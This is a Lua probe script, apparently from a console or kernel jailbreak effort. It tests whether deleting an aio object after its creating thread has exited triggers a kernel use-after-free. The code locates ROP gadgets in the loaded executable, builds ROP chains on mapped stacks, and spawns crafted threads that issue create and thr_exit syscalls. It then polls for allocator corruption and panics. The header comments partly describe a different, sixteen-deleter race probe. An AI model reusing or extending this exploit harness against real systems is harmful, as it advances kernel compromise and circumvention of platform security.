-- CRASH_CLASS: HIGH
-- PROBE 818a: delete an aio object whose creating thread has already exited, with an allocator-alias check
--
-- Context: an aio context C carries [C+0x10] = a refcounted page taken from
-- gs:[0]+0x140 of the thread that created it, and the delete drops that
-- reference (lock xadd [rdi],-1 -> free chain when it hits zero).  Every aio
-- object used so far was created by the Lua thread that also deleted it.
--
-- This probe splits the lifetime: a helper thread creates the object and then
-- exits through thr_exit(431), leaving the object orphaned, and the Lua thread
-- polls and deletes it afterwards.  If the reference on [C+0x10] does not keep
-- the creating thread's structures alive, the delete dereferences memory that
-- was freed when the thread exited - a single-threaded use-after-free that
-- needs no race at all.
--
-- Signals: a panic on the first delete (hard proof, costs a relaunch), a
-- delete that returns 0 with the object gone but the health check afterwards
-- disturbed, or a status error that no live object can produce.
--
-- Delete body reference: (offset 0x3af920) validates the entry, drops
-- the table lock at 0x3afe67, re-acquires it inside the lookup at 0x8ad5a2a0,
-- and then frees in this order: [W+0x18] (C, after a refcount drop), [T+0x10]
-- (S), [T+0x20] (D), [T+0x28] (P), T.  The guard that keeps a second caller out
-- of that block is a seven-instruction window:
--
--   0xad6feb7  mov r14,[r12+0x18]     ; C from the work item
--   0xad6fec3  test r14,r14 / je      ; already-cleared test
--   ...        refcount drop, free C
--   0xad6fef5  mov [r12+0x18],0       ; <- closes the window
--
-- 791f measured 395 doubled statuses in 1000 events with eight deleters, and
-- the allocator stayed clean, so either the second caller never passes the
-- guard or the double free is being absorbed.  Sixteen deleters on the same id
-- is the strongest form this harness can build: they are all parked in read(2)
-- and released back to back, so their syscalls are issued within microseconds
-- of each other.
--
-- Signals, strongest first:
--   * a creator after the round polls something other than 3, or its delete
--     fails, which means the 0x30 freelist handed out one chunk twice;
--   * two creators receive the same id;
--   * a deleter's status page shows 0 for an id that is already gone;
--   * the process dies inside a round (the loader then refuses connections).

print("=== PROBE 818a: delete an aio object whose creating thread has already exited ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local pop_rcx = find_pat(ebase, 0x494000, string.char(0x59,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx and jmp_g) then
    print("[0] gadgets missing") return
end
print(string.format("[0] eboot=%X", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local STACK = page*4

local function spawn_parked(fd, chainw)
    local block = mmap(STACK)
    if block == 0 then return false, 0 end
    local base = block + STACK - 0x200
    for i = 1, #chainw do wq(base + (i-1)*8, uint64(chainw[i])) end
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

-- 662(ids, 1, statpage) then thr_exit(431)
local function chain_delete(idpage, statpage)
    return {pop_rdi, idpage, pop_rsi, 1, pop_rdx, statpage,
            pop_rax, 662, fn, pop_rax, 431, fn, jmp_g}
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    return ok and to_num(rv) == 0, rd(fds) or 0, rd(fds+4) or 0
end

local sc669, sc662, sc664 = mk(669), mk(662), mk(664)
local function create1(data, out)
    local ok, rv = pcall(function() return sc669(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(out)) end)
    return to_num(rv), rd(out) or 0
end
local function poll1(ids, out)
    pcall(function() return sc664(uint64(ids), uint64(1), uint64(out)) end)
    return rd(out) or 0
end
local function del1(ids, out)
    local ok, rv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(out)) end)
    return to_num(rv), rd(out) or 0
end

local ROUNDS = 16
local one = memory.alloc(4)
local st  = mmap(page)
local anomalies, created, deleted = 0, 0, 0

-- chain: create(0x1001, data, 1, 1, out) then thr_exit(431)
-- r8 (arg5 = out) comes from the thread context, rcx from the pop below.
local function chain_orphan(data, out)
    return {pop_rdi, 0x1001, pop_rsi, data, pop_rdx, 1, pop_rcx, 1,
            pop_rax, 669, fn, pop_rax, 431, fn, jmp_g}
end

for round = 1, ROUNDS do
    local data, out = mmap(page), mmap(page)
    wd(data, round); wd(data+4, 7)
    local sok, a, b = pairsock()
    if not sok then print("[A] socketpair failed") break end
    local ctxR8 = out
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local ch = chain_orphan(data, out)
    for i = 1, #ch do wq(base + (i-1)*8, uint64(ch[i])) end
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(b));       wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    wq(ctx+Ctx.R8,  uint64(ctxR8))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    if not (ok and to_num(rv) == 0) then print(string.format("[A%d] thr_create failed", round)) break end
    pcall(function() return mk(WRITE)(uint64(a), uint64(buf), uint64(1), uint64(0), uint64(0)) end)
    sleep_ms(120)

    local id = rd(out) or 0
    if id == 0 then
        print(string.format("[B%d] child created nothing", round))
        anomalies = anomalies + 1
    else
        created = created + 1
        wd(one, id)
        local p = poll1(one, st)
        local drv, dst = del1(one, st)
        if drv == 0 and dst == 0 then deleted = deleted + 1 end
        print(string.format("[B%d] id=%06X poll=%08X delete rv=%d status=%08X", round, id, p, drv, dst))
    end
    -- health: one ordinary object created and destroyed by this thread
    local dd, oo = mmap(page), mmap(page)
    local crv, cid = create1(dd, oo)
    if crv == 0 and cid ~= 0 then
        wd(one, cid)
        local hp = poll1(one, st)
        local _, hs = del1(one, st)
        if hp ~= 3 or hs ~= 0 then
            anomalies = anomalies + 1
            print(string.format("[C%d] health anomaly poll=%X status=%X", round, hp, hs))
        end
    else
        anomalies = anomalies + 1
        print(string.format("[C%d] health create failed", round))
    end
end
print(string.format("[D] created=%d deleted=%d anomalies=%d", created, deleted, anomalies))
print(string.format("[E] alive pid=%s", tostring(to_num(native.fcall_with_rax(fn_ud, 20)))))
